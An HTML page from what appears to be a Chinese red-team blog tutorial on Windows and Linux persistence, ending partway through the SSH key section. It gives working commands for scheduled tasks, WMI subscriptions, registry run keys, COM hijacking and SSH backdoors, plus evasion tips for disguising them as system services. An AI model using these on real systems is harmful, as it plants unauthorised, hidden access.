@@ -1,0 +1,461 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows/Linux 权限维持技术 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="Windows 权限维持在获取目标系统的初始访问权限后，权限维持是确保长期控制的关键环节。通过部署持久化机制，可以在系统重启、用户注销、甚至部分安全检测后依然保持访问能力。  计划任务持久化原理计划任务（Scheduled Tasks）是 Windows 系统的合法功能，允许在特定时间或事件触发时自动执行程序。通过创建以 SYSTEM 权限运行的计划任务，可以实现高权限的持久化控制。 基础利用创建">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows&#x2F;Linux 权限维持技术">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/wc/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="Windows 权限维持在获取目标系统的初始访问权限后，权限维持是确保长期控制的关键环节。通过部署持久化机制，可以在系统重启、用户注销、甚至部分安全检测后依然保持访问能力。  计划任务持久化原理计划任务（Scheduled Tasks）是 Windows 系统的合法功能，允许在特定时间或事件触发时自动执行程序。通过创建以 SYSTEM 权限运行的计划任务，可以实现高权限的持久化控制。 基础利用创建">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-05.webp">
+<meta property="article:published_time" content="2026-02-13T08:47:20.680Z">
+<meta property="article:modified_time" content="2026-02-13T08:47:20.680Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="持久化技术">
+<meta property="article:tag" content="权限维持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-05.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Windows/Linux 权限维持技术",
+  "url": "https://www.52jl.top/2026/02/13/wc/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-05.webp",
+  "datePublished": "2026-02-13T08:47:20.680Z",
+  "dateModified": "2026-02-13T08:47:20.680Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/wc/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows/Linux 权限维持技术',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows/Linux 权限维持技术</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Windows/Linux 权限维持技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:47:20.680Z" title="发表于 2026-02-13 16:47:20">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:47:20.680Z" title="更新于 2026-02-13 16:47:20">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="Windows-权限维持"><a href="#Windows-权限维持" class="headerlink" title="Windows 权限维持"></a>Windows 权限维持</h1><p>在获取目标系统的初始访问权限后，权限维持是确保长期控制的关键环节。通过部署持久化机制，可以在系统重启、用户注销、甚至部分安全检测后依然保持访问能力。</p>
+<hr>
+<h2 id="计划任务持久化"><a href="#计划任务持久化" class="headerlink" title="计划任务持久化"></a>计划任务持久化</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>计划任务（Scheduled Tasks）是 Windows 系统的合法功能，允许在特定时间或事件触发时自动执行程序。通过创建以 SYSTEM 权限运行的计划任务，可以实现高权限的持久化控制。</p>
+<h3 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h3><p><strong>创建每日执行的计划任务</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /ru system /u dbadmin /p admin!@#<span class="number">45</span> /tn transfer /sc DAILY /tr c:\transfer.exe /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>/s</code>：目标主机 IP（本地执行可省略）</li>
+<li><code>/ru</code>：运行权限（system &#x3D; SYSTEM 权限）</li>
+<li><code>/u</code>：登录用户名</li>
+<li><code>/p</code>：登录密码</li>
+<li><code>/tn</code>：任务名称</li>
+<li><code>/sc</code>：触发频率（DAILY &#x3D; 每天）</li>
+<li><code>/tr</code>：要执行的程序路径</li>
+<li><code>/f</code>：强制创建（覆盖同名任务）</li>
+</ul>
+<p><strong>手动触发任务</strong>（测试用）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /u dbadmin /p admin!@#<span class="number">45</span> /tn transfer /i</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除任务</strong>（清理痕迹）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /u dbadmin /p admin!@#<span class="number">45</span> /tn transfer /f</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="隐蔽性优化"><a href="#隐蔽性优化" class="headerlink" title="隐蔽性优化"></a>隐蔽性优化</h3><p><strong>1. 开机自启动</strong>（最常用）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /ru system /u dbadmin /p admin!@#<span class="number">45</span> /tn &quot;Windows Update Check&quot; /sc ONSTART /tr c:\windows\temp\svchost.exe /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>优势</strong>：</p>
+<ul>
+<li>系统启动时自动执行，无需等待特定时间</li>
+<li>任务名称伪装成系统服务（如 “Windows Update Check”）</li>
+<li>程序路径放在系统目录（如 <code>C:\Windows\Temp</code>）降低可疑度</li>
+</ul>
+<p><strong>2. 高频执行</strong>（每 10 分钟）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /ru system /u dbadmin /p admin!@#<span class="number">45</span> /tn &quot;SystemHealthCheck&quot; /sc MINUTE /mo <span class="number">10</span> /tr c:\windows\system32\tasks\health.exe /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 用户登录触发</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /ru system /u dbadmin /p admin!@#<span class="number">45</span> /tn &quot;UserProfileSync&quot; /sc ONLOGON /tr c:\programdata\sync.exe /f</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 系统空闲时执行</strong>（降低检测风险）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">144</span> /ru system /u dbadmin /p admin!@#<span class="number">45</span> /tn &quot;DiskCleanup&quot; /sc ONIDLE /i <span class="number">15</span> /tr c:\windows\temp\cleanup.exe /f</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ol>
+<li><p><strong>服务依赖</strong>：</p>
+<ul>
+<li>Task Scheduler 服务必须运行（默认启用）</li>
+<li>远程操作需开放 135&#x2F;445 端口</li>
+</ul>
+</li>
+<li><p><strong>权限要求</strong>：</p>
+<ul>
+<li>本地管理员权限</li>
+<li>远程操作需目标主机的管理员凭证</li>
+</ul>
+</li>
+<li><p><strong>程序部署</strong>：</p>
+<ul>
+<li>恶意程序必须已上传到目标路径</li>
+<li>建议使用绝对路径避免执行失败</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="检测与对抗"><a href="#检测与对抗" class="headerlink" title="检测与对抗"></a>检测与对抗</h3><p><strong>蓝队检测方法</strong>：</p>
+<ul>
+<li>监控 <code>schtasks.exe</code> 进程创建事件（Event ID 4698）</li>
+<li>检查异常的 SYSTEM 权限任务</li>
+<li>分析任务执行路径是否在非标准目录</li>
+</ul>
+<p><strong>红队规避技巧</strong>：</p>
+<ul>
+<li>使用 COM 接口创建任务（绕过 schtasks.exe 监控）</li>
+<li>任务名称和路径伪装成系统组件</li>
+<li>设置任务在特定时间段执行（如凌晨 3 点）</li>
+<li>结合其他持久化方法分散特征</li>
+</ul>
+<hr>
+<h2 id="DLL-劫持持久化"><a href="#DLL-劫持持久化" class="headerlink" title="DLL 劫持持久化"></a>DLL 劫持持久化</h2><p>DLL 劫持是利用 Windows DLL 搜索顺序的特性，通过在高优先级路径放置恶意 DLL，使合法程序加载恶意代码。</p>
+<p>详细技术请参考另一篇文章：<a href="./cs3.md">DLL 劫持技术详解</a></p>
+<p><strong>核心优势</strong>：</p>
+<ul>
+<li>无需修改注册表或创建服务</li>
+<li>依托合法程序执行，隐蔽性极高</li>
+<li>可实现开机自启（劫持开机启动程序的 DLL）</li>
+</ul>
+<hr>
+<h2 id="WMI-事件订阅持久化"><a href="#WMI-事件订阅持久化" class="headerlink" title="WMI 事件订阅持久化"></a>WMI 事件订阅持久化</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>WMI（Windows Management Instrumentation）是 Windows 的管理框架，支持事件订阅机制。通过创建 WMI 事件过滤器和消费者，可以在特定系统事件发生时自动执行恶意程序。</p>
+<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>1. 创建事件过滤器</strong>（监控系统运行时间）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;WindowsUpdate&quot;, EventNamespace=&quot;root\cimv2&quot;, QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN <span class="number">60</span> WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= <span class="number">240</span> AND TargetInstance.SystemUpTime &lt; <span class="number">260</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤器解析</strong>：</p>
+<ul>
+<li><code>WITHIN 60</code>：每 60 秒检测一次</li>
+<li><code>SystemUpTime &gt;= 240 AND &lt; 260</code>：系统运行时间在 240-260 秒之间触发</li>
+<li>这意味着系统启动后约 4 分钟会执行一次</li>
+</ul>
+<p><strong>2. 创建命令行消费者</strong>（指定要执行的程序）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer CREATE Name=&quot;WindowsUp&quot;, ExecutablePath=&quot;C:\Users\sqladmin\Desktop\beacon.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 绑定过滤器和消费者</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;WindowsUpdate\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;WindowsUp\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="高级触发条件"><a href="#高级触发条件" class="headerlink" title="高级触发条件"></a>高级触发条件</h3><p><strong>1. 监控进程启动</strong>（当特定进程启动时触发）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;ProcessMonitor&quot;, EventNamespace=&quot;root\cimv2&quot;, QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceCreationEvent WITHIN <span class="number">5</span> WHERE TargetInstance ISA &#x27;Win32_Process&#x27; AND TargetInstance.Name=&#x27;explorer.exe&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 监控用户登录</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;UserLogin&quot;, EventNamespace=&quot;root\cimv2&quot;, QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceCreationEvent WITHIN <span class="number">15</span> WHERE TargetInstance ISA &#x27;Win32_LogonSession&#x27; AND TargetInstance.LogonType=<span class="number">2</span>&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 监控文件创建</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter CREATE Name=&quot;FileMonitor&quot;, EventNamespace=&quot;root\cimv2&quot;, QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceCreationEvent WITHIN <span class="number">10</span> WHERE TargetInstance ISA &#x27;CIM_DataFile&#x27; AND TargetInstance.Drive=&#x27;C:&#x27; AND TargetInstance.<span class="built_in">Path</span>=&#x27;\\Users\\Public\\&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="查询和清理"><a href="#查询和清理" class="headerlink" title="查询和清理"></a>查询和清理</h3><p><strong>查询现有 WMI 订阅</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看所有事件过滤器</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter GET __RELPATH, Name, Query</span><br><span class="line"></span><br><span class="line"># 查看所有消费者</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer GET Name, ExecutablePath</span><br><span class="line"></span><br><span class="line"># 查看绑定关系</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding GET Filter, Consumer</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除 WMI 订阅</strong>：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 删除绑定</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __FilterToConsumerBinding WHERE Filter=&quot;__EventFilter.Name=&#x27;WindowsUpdate&#x27;&quot; DELETE</span><br><span class="line"></span><br><span class="line"># 删除消费者</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer WHERE Name=&quot;WindowsUp&quot; DELETE</span><br><span class="line"></span><br><span class="line"># 删除过滤器</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter WHERE Name=&quot;WindowsUpdate&quot; DELETE</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="检测与对抗-1"><a href="#检测与对抗-1" class="headerlink" title="检测与对抗"></a>检测与对抗</h3><p><strong>蓝队检测</strong>：</p>
+<ul>
+<li>监控 WMI 命名空间 <code>root\subscription</code> 的修改</li>
+<li>检查异常的 CommandLineEventConsumer</li>
+<li>使用 Autoruns 工具查看 WMI 持久化</li>
+</ul>
+<p><strong>红队规避</strong>：</p>
+<ul>
+<li>使用 PowerShell 脚本创建（避免 wmic.exe 进程特征）</li>
+<li>过滤器名称伪装成系统组件</li>
+<li>设置复杂的触发条件（降低执行频率）</li>
+<li>消费者使用脚本而非直接执行 EXE</li>
+</ul>
+<hr>
+<h2 id="其他-Windows-持久化方法"><a href="#其他-Windows-持久化方法" class="headerlink" title="其他 Windows 持久化方法"></a>其他 Windows 持久化方法</h2><h3 id="注册表自启动"><a href="#注册表自启动" class="headerlink" title="注册表自启动"></a>注册表自启动</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Run 键（用户登录时执行）</span><br><span class="line">reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v &quot;Updater&quot; /t REG_SZ /d &quot;C:\Windows\Temp\update.exe&quot; /f</span><br><span class="line"></span><br><span class="line"># RunOnce 键（执行一次后自动删除）</span><br><span class="line">reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&quot; /v &quot;Setup&quot; /t REG_SZ /d &quot;C:\ProgramData\setup.exe&quot; /f</span><br><span class="line"></span><br><span class="line"># 服务启动（SYSTEM 权限）</span><br><span class="line">sc create &quot;WindowsUpdateService&quot; binPath= &quot;C:\Windows\System32\svchost.exe&quot; <span class="built_in">start</span>= auto</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 复制到启动文件夹</span><br><span class="line"><span class="built_in">copy</span> beacon.exe &quot;C:\Users\<span class="variable">%USERNAME%</span>\AppData\Roaming\Microsoft\Windows\<span class="built_in">Start</span> Menu\Programs\Startup\svchost.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="COM-劫持"><a href="#COM-劫持" class="headerlink" title="COM 劫持"></a>COM 劫持</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 劫持 CLSID（需要详细分析目标 COM 对象）</span><br><span class="line">reg add &quot;HKCU\Software\Classes\CLSID\&#123;CLSID&#125;\InprocServer32&quot; /ve /t REG_SZ /d &quot;C:\evil.dll&quot; /f</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="Linux-权限维持"><a href="#Linux-权限维持" class="headerlink" title="Linux 权限维持"></a>Linux 权限维持</h1><p>Linux 系统的权限维持通常利用 SSH 密钥、Cron 任务、系统服务等合法功能实现持久化。</p>
+<hr>
+<h2 id="SSH-密钥免密登录"><a href="#SSH-密钥免密登录" class="headerlink" title="SSH 密钥免密登录"></a>SSH 密钥免密登录</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>SSH 公钥认证允许客户端使用私钥进行身份验证，无需输入密码。通过将攻击者的公钥添加到目标主机的 <code>authorized_keys</code> 文件，可以实现持久化的免密访问。</p>
+<h3 id="实现步骤-1"><a href="#实现步骤-1" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>1. 在攻击机生成 SSH 密钥对</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;backup@system.local&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-t rsa</code>：密钥类型（RSA 算法）</li>
+<li><code>-b 4096</code>：密钥长度（4096 位，更安全）</li>
+<li><code>-C</code>：注释（可伪装成系统账户）</li>
+</ul>
+<p><strong>生成的文件</strong>：</p>
+<ul>
+<li><code>~/.ssh/id_rsa</code>：私钥（保存在攻击机，绝对不能泄露）</li>
+<li><code>~/.ssh/id_rsa.pub</code>：公钥（上传到目标主机）</li>
+</ul>
+<p><strong>2. 上传公钥到目标主机</strong>：</p>
